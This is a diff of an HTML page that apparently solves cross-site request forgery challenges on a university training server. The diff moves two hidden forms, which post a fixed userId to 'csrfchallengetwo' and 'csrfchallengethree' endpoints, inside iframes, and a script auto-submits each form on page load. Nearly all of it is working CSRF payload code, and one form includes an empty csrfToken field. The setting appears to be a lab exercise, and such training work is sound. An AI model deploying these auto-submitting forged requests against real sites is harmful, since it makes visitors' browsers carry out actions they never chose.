@@ -1,18 +1,21 @@
-<form id="antmoForm1" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
-<input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
-<input type="submit"/>
-</form>
-<iframe name="iframe1"/>
-<script>
-document.getElementById("antmoForm1").submit();
-</script>
+<iframe name="iframe1">
+    <form id="antmoForm1" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
+        <input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
+        <input type="submit"/>
+    </form>
 
-<form id="antmoForm2" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus" method="POST">
-<input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
-    <input type="hidden" name="csrfToken"/>
-<input type="submit"/>
-</form>
-<iframe name="iframe2"/>
-<script>
-document.getElementById("antmoForm2").submit();
-</script>
+    <script>
+        document.getElementById("antmoForm1").submit();
+    </script>
+</iframe>
+<iframe name="iframe2">
+    <form id="antmoForm2" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus" method="POST">
+        <input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
+        <input type="hidden" name="csrfToken"/>
+        <input type="submit"/>
+    </form>
+    <iframe name="iframe2"/>
+    <script>
+        document.getElementById("antmoForm2").submit();
+    </script>
+</iframe>
